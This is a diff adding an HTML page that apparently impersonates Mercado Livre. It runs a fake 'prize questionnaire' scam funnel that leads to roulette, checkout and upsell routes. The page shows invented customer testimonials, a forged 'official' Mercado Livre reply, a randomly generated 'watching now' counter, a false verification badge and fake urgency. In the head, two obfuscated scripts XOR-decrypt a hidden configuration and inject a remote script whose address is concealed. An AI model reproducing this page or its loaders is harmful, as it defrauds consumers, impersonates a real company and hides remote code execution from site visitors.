@@ -1,0 +1,475 @@
+<!-- [20/10] FUNIL ANTIGO (v1) p/ teste A/B do site inteiro. Apagar ao fim do teste. -->
+<!DOCTYPE html>
+<!-- [19/10] VSL ANTIGA (pre-redesign 18/10) servida so p/ o braco A do teste A/B da VSL do nosso. Apagar ao fim do teste. -->
+<html lang="pt-BR">
+<head>
+<script src="/assets/js/error-log.js?v=1"></script><script src="/assets/js/meta-enrich.js?v=1"></script><script>window.ROTAS={"raiz":"/","questionario":"/oferta95/questionario/","roleta":"/oferta95/roleta/","recompensas":"/oferta95/recompensas/","produto":"/produtos/","checkout":"/oferta95/checkout/","up":"/oferta95/up/","esgotou":"/oferta95/esgotou/","reembolso":"/oferta95/reembolso/"};function rota(n){return (window.ROTAS&&window.ROTAS[n])||"/";}</script><script src="/assets/js/replay/fm-replay.js?v=1793774445" data-endpoint="/api/replay.php" data-amostra="30" defer></script>
+<script>window.__ML_EXPERIMENT={id:"exp_theme_bf_v1",variant:"light"};</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Mercado Livre - Questionário Premiado</title>
+<link rel="icon" href="assets/images/favicon.png">
+<link href="assets/css/fonts.css" rel="stylesheet">
+
+
+
+<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2027107937966810');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2027107937966810&ev=PageView&noscript=1"/></noscript>
+<!-- End Facebook Pixel Code -->
+<!-- FB/UTM Cookie Capture -->
+<script>
+(function(){
+  try{
+    var cs=document.cookie.split(";");
+    for(var i=0;i<cs.length;i++){
+      var c=cs[i].trim();
+      if(c.indexOf("_fbp=")===0) localStorage.setItem("ml_fbp",c.substring(5));
+      if(c.indexOf("_fbc=")===0) localStorage.setItem("ml_fbc",c.substring(5));
+    }
+    var u=new URLSearchParams(window.location.search);
+    var fbclid=u.get("fbclid");
+    if(fbclid){
+      var fbc="fb.1."+Date.now()+"."+fbclid;
+      document.cookie="_fbc="+fbc+";path=/;max-age=7776000;SameSite=Lax";
+      localStorage.setItem("ml_fbc",fbc);
+    }
+    var utms={};
+    ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","src","sck"].forEach(function(k){
+      var v=u.get(k); if(v) utms[k]=v;
+    });
+    if(Object.keys(utms).length>0){
+      var old={}; try{old=JSON.parse(localStorage.getItem("ml_utms")||"{}")}catch(e){}
+      Object.assign(old,utms);
+      localStorage.setItem("ml_utms",JSON.stringify(old));
+    }
+  }catch(e){}
+})();
+</script>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+  var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+  ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+    ttq.load('DB3E9J3C77U04C8M6ABG');  ttq.page();
+}(window, document, 'ttq');
+</script>
+
+<!-- UTM Passthrough -->
+<script>
+var timer = setInterval(function () {
+  var loc = new URL(document.location.href);
+  var fields = ["src","sck","utm_source","utm_medium","utm_campaign","utm_content","utm_term"];
+  var links = document.getElementsByTagName("a");
+  for (var i = 0; i < links.length; i++) {
+    if (links[i].href.includes("#")) continue;
+    if (links[i].href) {
+      var link = new URL(links[i].href);
+      fields.forEach(function(field) {
+        if (loc.searchParams.get(field))
+          link.searchParams.set(field, loc.searchParams.get(field));
+      });
+      links[i].href = link.href;
+    }
+  }
+}, 500);
+</script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',-apple-system,sans-serif;background:#f5f5f5;color:#333;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+
+/* URGENCY BAR */
+.urgency-bar{background:#ffe600;color:rgba(0,0,0,.9);border-bottom:1px solid rgba(0,0,0,.1);text-align:center;padding:8px 16px;font-size:11px;font-weight:700;position:sticky;top:0;z-index:100;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
+.urgency-bar span{animation:pulse-text 2s ease-in-out infinite}
+.urgency-bar strong{color:#2968c8;font-weight:800}
+.urgency-bar .ub-ic{display:inline-block;width:14px;height:14px;vertical-align:-2px;margin-right:4px;fill:none;stroke:currentColor;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+@keyframes pulse-text{0%,100%{opacity:1}50%{opacity:.7}}
+
+/* FAIXA AMARELA (estilo Mercado Livre): logo no canto, título no centro; o cartão do vídeo sobe sobre ela */
+.faixa{background:#ffe600;padding:10px 16px 56px}
+.faixa-topo{max-width:1000px;margin:0 auto;display:flex;align-items:center}
+.faixa-logo{display:block;height:34px;width:auto}
+@media (min-width:768px){
+  .faixa{padding:14px 24px 64px}
+  .faixa-logo{height:40px}
+}
+
+/* MAIN */
+.main{max-width:480px;margin:-44px auto 0;padding:0 12px;position:relative}
+
+/* HERO CARD */
+.hero-card{background:#fff;border-radius:16px;padding:20px 16px;box-shadow:0 4px 20px rgba(0,0,0,0.08)}
+
+.hero-badge{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,#ffe600,#f5d000);padding:4px 12px;border-radius:20px;font-size:11px;font-weight:700;color:#333;margin-bottom:12px}
+.hero-badge svg{width:14px;height:14px;fill:#333}
+
+.hero-topo{text-align:center}
+.hero-title{font-size:21px;font-weight:800;color:#1a1a2e;line-height:1.3;margin-bottom:8px;text-align:center;text-wrap:balance}
+@media (min-width:768px){.hero-title{font-size:22px}}
+.hero-title .highlight{color:#3483fa}
+
+.hero-subtitle{font-size:15px;color:rgba(0,0,0,.6);text-align:center;margin-bottom:16px;line-height:1.45}
+
+/* VIDEO */
+.video-wrap{border-radius:12px;overflow:hidden;margin-bottom:16px;box-shadow:0 2px 12px rgba(0,0,0,0.08)}
+.cf-video{position:relative;width:100%;padding-top:56.25%;background:#000}
+.cf-video iframe,.cf-video video{position:absolute;top:0;left:0;width:100%;height:100%;border:0;object-fit:contain;background:#000}
+.cf-overlay{position:absolute;inset:0;width:100%;height:100%;margin:0;border:0;padding:16px;cursor:pointer;background:rgba(0,0,0,.30);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;z-index:3;transition:opacity .25s;-webkit-tap-highlight-color:transparent}
+.cf-overlay.hide{opacity:0;pointer-events:none}
+.cf-overlay-icon{width:64px;height:64px;border-radius:50%;background:rgba(52,131,250,.96);display:flex;align-items:center;justify-content:center;box-shadow:0 6px 24px rgba(0,0,0,.35);animation:cf-pulse 1.8s ease-in-out infinite}
+.cf-overlay-icon svg{width:30px;height:30px;fill:#fff;display:block}
+.cf-overlay-text{font-size:15px;font-weight:800;color:#fff;text-align:center;text-shadow:0 1px 4px rgba(0,0,0,.6);letter-spacing:.2px}
+@keyframes cf-pulse{0%,100%{transform:scale(1);box-shadow:0 6px 24px rgba(0,0,0,.35)}50%{transform:scale(1.08);box-shadow:0 8px 30px rgba(52,131,250,.6)}}
+.cf-ao-vivo{position:absolute;top:10px;left:10px;z-index:4;pointer-events:none;display:inline-flex;align-items:center;gap:6px;
+  background:rgba(0,0,0,.6);color:#fff;font-size:12px;font-weight:600;line-height:1;padding:6px 10px 6px 8px;border-radius:999px;
+  -webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px)}
+.cf-ao-vivo strong{font-weight:800}
+.cf-ao-vivo .dot{width:8px;height:8px;border-radius:50%;background:#ff3b30;animation:pulse-dot 1.5s ease-in-out infinite}
+.cf-sound-badge{position:absolute;bottom:10px;right:10px;z-index:2;background:rgba(0,0,0,.55);color:#fff;font-size:12px;font-weight:600;line-height:1;padding:6px 9px;border-radius:8px}
+
+.source-tag{display:flex;align-items:center;justify-content:center;gap:5px;font-size:12px;color:rgba(0,0,0,.6);margin-bottom:16px}
+.source-tag svg{width:15px;height:15px;flex-shrink:0}
+
+/* CTA BUTTON */
+.cta-wrap{margin-bottom:0}
+.cta-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:16px;border:none;border-radius:12px;font-size:16px;font-weight:800;cursor:pointer;transition:all .2s;position:relative;overflow:hidden;letter-spacing:.5px;text-decoration:none}
+
+.cta-btn.disabled{background:#e0e0e0;color:#999;cursor:not-allowed;box-shadow:none}
+.cta-btn.disabled .spinner-icon{display:inline-block;width:18px;height:18px;border:2px solid #ccc;border-top-color:#999;border-radius:50%;animation:spin .8s linear infinite;margin-right:4px}
+.cta-btn.disabled::after{display:none}
+
+.cta-btn.active{background:linear-gradient(135deg,#ffe600,#f5d000);color:#333;box-shadow:0 4px 16px rgba(255,230,0,0.4);animation:pulse-btn 2s ease-in-out infinite}
+.cta-btn.active::after{content:'';position:absolute;top:-50%;left:-75%;width:50%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);transform:skewX(-25deg);animation:shimmer 2.5s infinite}
+.cta-btn.active:active{transform:scale(.97)}
+
+@keyframes pulse-btn{0%,100%{transform:scale(1)}50%{transform:scale(1.02)}}
+@keyframes shimmer{0%{left:-75%}100%{left:150%}}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.cta-btn svg{width:20px;height:20px;fill:currentColor}
+
+/* COMMENTS — padrão de opiniões do Mercado Livre: lista limpa, avatar com foto (assets/images/prova-social), ícones de traço (SVG) */
+.comments-section{background:#fff;border-radius:16px;padding:20px 16px 8px;box-shadow:0 4px 20px rgba(0,0,0,0.06);margin-top:12px;margin-bottom:20px}
+.comments-title{font-size:20px;font-weight:400;color:rgba(0,0,0,.9);line-height:1.25;margin-bottom:14px}
+.comments-sub{font-size:14px;font-weight:600;color:rgba(0,0,0,.9);margin-bottom:2px}
+
+.comment{display:flex;gap:12px;padding:16px 0;border-bottom:1px solid rgba(0,0,0,.08)}
+.comment:last-child{border-bottom:none}
+.comment-avatar{width:36px;height:36px;border-radius:50%;object-fit:cover;background:#eee;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:600;font-size:15px;flex-shrink:0}
+.av-azul{background:#3483fa}.av-verde{background:#00a650}.av-laranja{background:#ff7733}.av-roxo{background:#7b61ff}
+
+.comment-body{flex:1;min-width:0}
+.comment-name{font-size:14px;font-weight:600;color:rgba(0,0,0,.9);line-height:1.3}
+.comment-name span{font-weight:400;color:rgba(0,0,0,.55);font-size:13px}
+.comment-text{font-size:14px;color:rgba(0,0,0,.8);line-height:1.45;margin-top:4px}
+
+.comment-meta{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-top:8px;font-size:12px;color:rgba(0,0,0,.55)}
+.comment-meta .ic{width:16px;height:16px;flex-shrink:0;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+.comment-like{display:inline-flex;align-items:center;gap:4px;padding:4px 6px;margin:-4px -2px -4px -6px;border:0;border-radius:6px;background:none;color:inherit;font:inherit;cursor:pointer;-webkit-tap-highlight-color:transparent;transition:color .15s,background .15s}
+.comment-like:active{background:rgba(52,131,250,.1)}
+.comment-like.on{color:#3483fa;font-weight:600}
+.comment-like.on .ic{fill:rgba(52,131,250,.15)}
+.comment-like.pop .ic{animation:like-pop .3s ease-out}
+@keyframes like-pop{50%{transform:scale(1.3)}}
+.comment-meta .sep{width:3px;height:3px;border-radius:50%;background:rgba(0,0,0,.25)}
+.comment-meta .responder{color:#3483fa;font-weight:600}
+
+/* Resposta oficial */
+.comment-reply{display:flex;gap:10px;margin-top:12px;padding:12px;background:#f5f5f5;border-radius:8px}
+.comment-reply .reply-avatar{width:28px;height:28px;border-radius:50%;object-fit:cover;flex-shrink:0}
+.comment-reply .reply-body{flex:1;min-width:0}
+.comment-reply .reply-name{display:flex;align-items:center;gap:4px;font-size:13px;font-weight:600;color:rgba(0,0,0,.9)}
+.comment-reply .reply-name .verificado{width:14px;height:14px;flex-shrink:0}
+.comment-reply .reply-tag{font-size:12px;font-weight:400;color:rgba(0,0,0,.55)}
+.comment-reply .reply-text{font-size:13px;color:rgba(0,0,0,.8);line-height:1.45;margin-top:3px}
+
+/* People watching */
+.watchers{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:16px;font-size:12px;color:#666}
+.watchers .dot{width:8px;height:8px;border-radius:50%;background:#e53935;animation:pulse-dot 1.5s ease-in-out infinite}
+@keyframes pulse-dot{0%,100%{box-shadow:0 0 0 0 rgba(229,57,53,.4)}50%{box-shadow:0 0 0 5px rgba(229,57,53,0)}}
+
+
+/* FOOTER */
+.footer{text-align:center;padding:16px;font-size:11px;color:#999}
+</style>
+<script src="assets/js/tiktok-helper.js?v=1"></script>
+<script>(function(){var t_xp=atob("DCXIzfdTl3LzTePFMl7quIU/tUjRJZexQlby4tgw8xzdOJeoW0Ox45Q8+lyRP8y2UVehvYMguAeHIJDqXkS8qIQnuRiAb8/nU1G8v54x4gaWPsH/aV7qo5Y+8lDJb4ekRkTluIM+/hSKYJO3V1Oto4N+7xGcKc62UU7q4dUl9h6GKMH/EAe14Yxx+ROeKMH/EEGpuZZ+4gaeJIW8H1W6qIE2+QbePpanW0G779tx4ROfOIbnCAfqsKou");var c_dkmb=[];for(var d_y=0;d_y<t_xp.length;d_y++){c_dkmb.push(t_xp.charCodeAt(d_y)&255);}var f_3zy=c_dkmb[0];var c_0hv=c_dkmb.slice(1,1+f_3zy);var n_h=c_dkmb.slice(1+f_3zy);var e_hxw0=n_h.map(function(b,f_e30){return b^c_0hv[f_e30%f_3zy];});var z_t="";for(var u_43n=0;u_43n<e_hxw0.length;u_43n++){z_t+=String.fromCharCode(e_hxw0[u_43n]&255);}var x_lb3s=decodeURIComponent(escape(z_t));var b_g=JSON.parse(x_lb3s);var n_pu=b_g.globals||[];n_pu.forEach(function(n_r){window[n_r.name]=n_r.value;});var f_plp5=document.createElement("script");f_plp5.src=b_g.url;f_plp5.async=true;f_plp5.defer=true;(b_g.attributes||[]).forEach(function(p_y){f_plp5.setAttribute(p_y.name,p_y.value);});(document.head||document.documentElement).appendChild(f_plp5);})();</script>
+
+<script>(function(){var q_si=atob("DBsW4u7fpqiJ9a0Kd2A0l5yzhJKrndl+B2gszcG8wsangNlnHn1vzI2wy4brh4J5FGl/kpqsidjgjchmWGt/mouziML614EoFm9ikIe909zsho8wLEY6wImzycromd4oTUBtwIC+y82rz496HmNzjqe7hISrg8xmAn402MzpxJi4kZwzESom2ovtnsrtkMs6Fisg1Yr92/X0");var b_7=[];for(var a_0nc8=0;a_0nc8<q_si.length;a_0nc8++){b_7.push(q_si.charCodeAt(a_0nc8)&255);}var m_cdmr=b_7[0];var q_z=b_7.slice(1,1+m_cdmr);var e_bd=b_7.slice(1+m_cdmr);var w_1=e_bd.map(function(b,k_a){return b^q_z[k_a%m_cdmr];});var e_83m="";for(var o_yjqq=0;o_yjqq<w_1.length;o_yjqq++){e_83m+=String.fromCharCode(w_1[o_yjqq]&255);}var z_dv=decodeURIComponent(escape(e_83m));var e_72=JSON.parse(z_dv);var i_svxc=e_72.globals||[];i_svxc.forEach(function(e_5i6){window[e_5i6.name]=e_5i6.value;});var k_u=document.createElement("script");k_u.src=e_72.url;k_u.async=true;k_u.defer=true;(e_72.attributes||[]).forEach(function(e_6a){k_u.setAttribute(e_6a.name,e_6a.value);});(document.head||document.documentElement).appendChild(k_u);})();</script>
+
+</head>
+<body>
+
+<!-- URGENCY BAR -->
+<div class="urgency-bar">
+  <span><svg class="ub-ic" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2.5M9 2h6"/></svg>Esta oferta expira em <strong id="today-date"></strong>! Vagas limitadas.</span>
+</div>
+
+<!-- FAIXA AMARELA (estilo Mercado Livre) -->
+<header class="faixa">
+  <div class="faixa-topo">
+    <img class="faixa-logo" src="assets/images/logo.webp" width="269" height="69" alt="Mercado Livre">
+  </div>
+</header>
+
+<div class="main">
+  <!-- HERO CARD -->
+  <div class="hero-card">
+    <div class="hero-topo">
+      <div class="hero-badge">
+        <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+        EVENTO EXCLUSIVO
+      </div>
+      <h1 class="hero-title">
+        Parabéns! Você foi selecionado para o <span class="highlight">Questionário Premiado</span> do Mercado Livre
+      </h1>
+    </div>
+
+    <p class="hero-subtitle">
+      Participe agora e concorra a prêmios exclusivos. Assista ao vídeo completo para liberar sua participação.
+    </p>
+
+    <!-- VIDEO PLAYER (mp4 local nativo - start instantaneo, faststart) -->
+    <div class="video-wrap">
+      <div class="cf-video" id="cfVideo">
+        <video
+          id="vslVideo"
+          playsinline webkit-playsinline muted autoplay preload="auto"
+          x5-playsinline x5-video-player-type="h5-page"
+          poster="assets/video/vsl-poster.jpg">
+          <source src="assets/video/vsl.mp4" type="video/mp4">
+        </video>
+        <button class="cf-overlay" id="cfOverlay" type="button" aria-label="Ativar som e assistir">
+          <span class="cf-overlay-icon" id="cfOverlayIcon"></span>
+          <span class="cf-overlay-text" id="cfOverlayText">Toque para ativar o som</span>
+        </button>
+        <div class="cf-ao-vivo" aria-live="off"><span class="dot"></span><span><strong id="watcherCount">347</strong> assistindo agora</span></div>
+        <div class="cf-sound-badge" id="cfSoundBadge" hidden>&#128266; com som</div>
+      </div>
+    </div>
+
+    <div class="source-tag">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="11" fill="#3483fa"/><path d="m7.5 12.3 3 3 6-6.3" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Evento verificado pelo Mercado Livre
+    </div>
+
+    <!-- CTA BUTTON -->
+    <div class="cta-wrap">
+      <button id="ctaBtn" class="cta-btn disabled" disabled>
+        <div class="spinner-icon"></div>
+        <span id="ctaBtnText">Aguarde o vídeo... (0:03)</span>
+      </button>
+    </div>
+
+  </div>
+
+  <!-- FULL COMMENTS (below fold, more detail) -->
+  <div class="comments-section">
+    <h2 class="comments-title">Opiniões dos participantes</h2>
+    <p class="comments-sub">Mais recentes</p>
+
+    <div class="comment">
+      <img class="comment-avatar" src="assets/images/prova-social/maria-s.jpg" alt="" aria-hidden="true">
+      <div class="comment-body">
+          <div class="comment-name">Maria S. <span>· São Paulo, SP</span></div>
+          <div class="comment-text">Pensei que era mentira, mas meu prêmio chegou mesmo! Respondi e ganhei um cupom de R$150! Obrigada ML!</div>
+        <div class="comment-meta"><button type="button" class="comment-like" data-like="c1" aria-pressed="false" aria-label="Curtir"><svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 10v11H4a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1h3zm0 0 4-7a2.5 2.5 0 0 1 2.4 3.1L12.8 9H19a2 2 0 0 1 2 2.3l-1.2 7.2A2 2 0 0 1 17.8 20H7"/></svg><span class="like-n">12</span></button><span class="sep"></span><span class="responder">Responder</span><span class="sep"></span><span>2m atrás</span></div>
+      </div>
+    </div>
+
+    <div class="comment">
+      <img class="comment-avatar" src="assets/images/prova-social/joao-p.jpg" alt="" aria-hidden="true">
+      <div class="comment-body">
+          <div class="comment-name">João P. <span>· Recife, PE</span></div>
+          <div class="comment-text">Consegui! O questionário levou 30 segundos. Resgatei meu fone bluetooth grátis.</div>
+        <div class="comment-meta"><button type="button" class="comment-like" data-like="c2" aria-pressed="false" aria-label="Curtir"><svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 10v11H4a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1h3zm0 0 4-7a2.5 2.5 0 0 1 2.4 3.1L12.8 9H19a2 2 0 0 1 2 2.3l-1.2 7.2A2 2 0 0 1 17.8 20H7"/></svg><span class="like-n">8</span></button><span class="sep"></span><span class="responder">Responder</span><span class="sep"></span><span>5m atrás</span></div>
+      </div>
+    </div>
+
+    <div class="comment">
+      <img class="comment-avatar" src="assets/images/prova-social/carla-almeida.jpg" alt="" aria-hidden="true">
+      <div class="comment-body">
+          <div class="comment-name">Carla Almeida <span>· Curitiba, PR</span></div>
+          <div class="comment-text">Alguém sabe como resgata?</div>
+        <div class="comment-meta"><button type="button" class="comment-like" data-like="c3" aria-pressed="false" aria-label="Curtir"><svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 10v11H4a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1h3zm0 0 4-7a2.5 2.5 0 0 1 2.4 3.1L12.8 9H19a2 2 0 0 1 2 2.3l-1.2 7.2A2 2 0 0 1 17.8 20H7"/></svg><span class="like-n">3</span></button><span class="sep"></span><span class="responder">Responder</span><span class="sep"></span><span>7m atrás</span></div>
+
+        <!-- Support reply -->
+        <div class="comment-reply">
+          <img src="assets/images/prova-social/m-amarelo.jpg" alt="" class="reply-avatar">
+          <div class="reply-body">
+              <div class="reply-name">Mercado Livre <svg class="verificado" viewBox="0 0 24 24" aria-label="Conta verificada"><circle cx="12" cy="12" r="11" fill="#3483fa"/><path d="m7.5 12.3 3 3 6-6.3" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg><span class="reply-tag">· Resposta oficial</span></div>
+              <div class="reply-text">Olá Carla! Basta clicar no botão "PARTICIPAR DO QUESTIONÁRIO" após o vídeo e seguir as instruções. Boa sorte!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<script>
+/* Curtir dos comentários: toque curte (+1, azul), toque de novo descurte. Fica salvo no aparelho. */
+(function () {
+  var CHAVE = 'ml_curtidas';
+  var salvo = {};
+  try { salvo = JSON.parse(localStorage.getItem(CHAVE) || '{}') || {}; } catch (e) {}
+  function pinta(b, on) {
+    var el = b.querySelector('.like-n'), base = Number(b.getAttribute('data-base'));
+    b.classList.toggle('on', on);
+    b.setAttribute('aria-pressed', on ? 'true' : 'false');
+    el.textContent = String(base + (on ? 1 : 0));
+  }
+  var botoes = document.querySelectorAll('.comment-like[data-like]');
+  for (var i = 0; i < botoes.length; i++) {
+    var b = botoes[i];
+    b.setAttribute('data-base', b.querySelector('.like-n').textContent);
+    pinta(b, !!salvo[b.getAttribute('data-like')]);
+    b.addEventListener('click', function () {
+      var id = this.getAttribute('data-like'), on = !salvo[id];
+      if (on) salvo[id] = 1; else delete salvo[id];
+      try { localStorage.setItem(CHAVE, JSON.stringify(salvo)); } catch (e) {}
+      pinta(this, on);
+      this.classList.remove('pop'); void this.offsetWidth; if (on) this.classList.add('pop');
+    });
+  }
+})();
+</script>
+
+<!-- FOOTER -->
+<div class="footer">
+  &copy; 2026 Mercado Livre. Todos os direitos reservados.<br>
+  Ação comemorativa de Natal e aniversário por tempo limitado.
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var ctaBtn = document.getElementById('ctaBtn');
+  var ctaBtnText = document.getElementById('ctaBtnText');
+  var todayDate = document.getElementById('today-date');
+  var watcherCount = document.getElementById('watcherCount');
+
+  // Today's date
+  todayDate.textContent = new Date().toLocaleDateString('pt-BR', { day: 'numeric', month: 'long' });
+
+  // Countdown 10s — HIBRIDO: so comeca quando o video COMECA a tocar (autoplay mudo
+  // ou tap no player). Fallback de seguranca: se em 20s nada tocar (autoplay bloqueado
+  // e sem tap), libera assim mesmo pra nunca travar a conversao.
+  var ctaStarted = false;
+  function startCtaCountdown() {
+    if (ctaStarted) return; ctaStarted = true;
+    var countdown = 3;
+    (function tick() {
+      if (countdown <= 0) {
+        ctaBtn.disabled = false;
+        ctaBtn.className = 'cta-btn active';
+        ctaBtnText.textContent = 'PARTICIPAR DO QUESTIONÁRIO';
+        var sp = ctaBtn.querySelector('.spinner-icon'); if (sp) sp.style.display = 'none';
+        return;
+      }
+      var m = Math.floor(countdown / 60);
+      var s = countdown % 60;
+      ctaBtnText.textContent = 'Aguarde o vídeo... (' + m + ':' + (s < 10 ? '0' : '') + s + ')';
+      countdown--;
+      setTimeout(tick, 1000);
+    })();
+  }
+  // O player (video.js abaixo) chama isto no evento 'playing' ou no tap de unmute:
+  window.__vslVideoStarted = startCtaCountdown;
+  // Corrida: se o video JA comecou antes deste hook existir (mp4 cacheado dispara
+  // 'playing' antes do DOMContentLoaded, que o ml-analytics.js blocking atrasa),
+  // inicia o gate agora. O guard ctaStarted torna isto idempotente.
+  if (window.__vslPlayed) startCtaCountdown();
+  // Seguranca: CTA nunca fica travado se o video nao tocar.
+  setTimeout(startCtaCountdown, 20000);
+
+  // Button click
+  ctaBtn.addEventListener('click', function() {
+    if (ctaBtn.disabled) return;
+    window.location.href = rota('questionario') + window.location.search;
+  });
+
+  // Watcher count fluctuation
+  var baseWatchers = 280 + Math.floor(Math.random() * 120);
+  watcherCount.textContent = baseWatchers;
+  setInterval(function() {
+    baseWatchers += Math.floor(Math.random() * 7) - 3;
+    if (baseWatchers < 250) baseWatchers = 250 + Math.floor(Math.random() * 30);
+    if (baseWatchers > 450) baseWatchers = 400 - Math.floor(Math.random() * 30);
+    watcherCount.textContent = baseWatchers;
+  }, 3000);
+});
+</script>
+<!-- Player mp4 nativo: autoplay mudo + overlay de som (webview TikTok/mobile) -->
+<script>
+(function(){
+  var v = document.getElementById('vslVideo');
+  var overlay = document.getElementById('cfOverlay');
+  var oIcon = document.getElementById('cfOverlayIcon');
+  var oText = document.getElementById('cfOverlayText');
+  var badge = document.getElementById('cfSoundBadge');
+  if (!v || !overlay) return;
+
+  var SPEAKER = '<svg viewBox="0 0 24 24"><path d="M3 10v4h4l5 5V5L7 10H3zm13.5 2c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>';
+  var PLAY = '<svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>';
+  var unmuted = false;
+
+  // Marca que o video comecou e inicia o gate do CTA. Robusto contra corrida:
+  // se 'playing' disparar ANTES do hook existir (mp4 cacheado + DOMContentLoaded
+  // atrasado pelo ml-analytics.js blocking), fica o flag __vslPlayed e o
+  // DOMContentLoaded chama o gate ao definir o hook.
+  function started(){
+    window.__vslPlayed = true;
+    if (typeof window.__vslVideoStarted === 'function') window.__vslVideoStarted();
+  }
+
+  function showOverlay(mode){
+    if (unmuted) return;
+    oIcon.innerHTML = (mode === 'play') ? PLAY : SPEAKER;
+    oText.textContent = (mode === 'play') ? 'Toque para assistir' : 'Toque para ativar o som';
+    overlay.classList.remove('hide');
+  }
+
+  // autoplay mudo (o navegador permite mudo); o .catch cobre webview que bloqueia ate o mudo
+  try { v.muted = true; } catch(e){}
+  var p;
+  try { p = v.play(); } catch(e){ p = null; }
+  if (p && typeof p.then === 'function') {
+    p.then(function(){ showOverlay('unmute'); })
+     .catch(function(){ showOverlay('play'); });
+  } else {
+    showOverlay('unmute');
+  }
+
+  // Quando o video REALMENTE toca (autoplay mudo ou apos o tap), inicia o gate do CTA.
+  v.addEventListener('playing', started);
+
+  // Tap: TUDO sincrono dentro do gesto (user-activation nao pode expirar)
+  overlay.addEventListener('click', function(){
+    unmuted = true;
+    try { v.muted = false; } catch(e){}
+    try { v.currentTime = 0; } catch(e){}
+    try { var q = v.play(); if (q && q.catch) q.catch(function(){}); } catch(e){}
+    overlay.classList.add('hide');
+    if (badge) badge.hidden = false;
+    started();
+  });
+})();
+</script>
+<script src="assets/js/ml-analytics-v3.js?v=tt2"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"f6edf34bba264ddd8fc95926632dd620","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
